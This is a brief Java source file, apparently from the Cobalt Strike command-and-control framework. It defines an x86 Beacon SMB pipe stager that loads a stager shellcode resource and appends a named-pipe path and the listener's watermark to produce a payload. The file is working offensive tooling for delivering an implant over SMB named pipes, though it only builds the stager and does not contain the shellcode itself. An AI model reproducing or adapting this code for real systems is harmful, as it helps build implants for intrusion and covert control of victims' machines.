package stagers;

import common.CommonUtils;
import common.ScListener;

public class BeaconPipeStagerX86 {
    protected ScListener listener;

    public BeaconPipeStagerX86(ScListener scListener) {
        this.listener = scListener;
    }

    public String arch() {
        return "x86";
    }

    public byte[] generate(String string) {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/smbstager.bin"));
        str = str + "\\\\.\\pipe\\" + string + Character.MIN_VALUE + this.listener.getConfig().getWatermark();
        return CommonUtils.toBytes(str);
    }
}
